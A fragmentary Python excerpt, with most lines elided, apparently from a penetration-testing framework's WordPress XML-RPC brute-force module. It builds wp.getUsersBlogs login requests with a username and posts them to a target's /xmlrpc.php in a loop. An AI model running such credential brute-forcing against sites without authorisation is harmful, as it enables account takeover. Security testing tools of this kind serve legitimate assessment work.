    ...
    try:
        ...
        while 1:
            try:
                ...
                postdata = (
                    """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>"""
                    + user
...
def test(
    ...
    while 1:
        try:
            ...
            try:
                req = requests.post(
                    target + "/xmlrpc.php", data=postdata, headers=headers
                )
                # print (target)
...
def start(
    ...
    if (
        ...
        warn(messages(language, "input_target_error").format("wp_xmlrpc_brute", target))
